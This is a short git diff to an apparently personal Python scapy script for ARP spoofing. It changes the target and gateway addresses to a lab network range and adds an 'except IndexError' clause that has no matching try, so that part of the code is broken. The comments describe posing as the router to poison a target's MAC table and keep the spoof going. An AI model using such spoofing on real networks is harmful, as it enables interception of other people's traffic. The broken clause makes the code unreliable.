@@ -12,6 +12,12 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
+except IndexError
+        pass
+
+
+
+
 
 # set op to 2 for arp respond (for scapy parameters refer to scapy_options.py or onenote)
 # packet creation to redirect them to the target i will act as the router the mac table of the target will associate
@@ -40,8 +46,8 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "192.168.1.11"
-gateway_ip = "192.168.1.1"
+target_ip = "192.168.56.5"
+gateway_ip = "192.168.56.4"
 
 # Be in the middle of the connection and send continiously packets and sleep two secs
 # to maintain spoofing. otherwise it will send one packet only and mac address will change
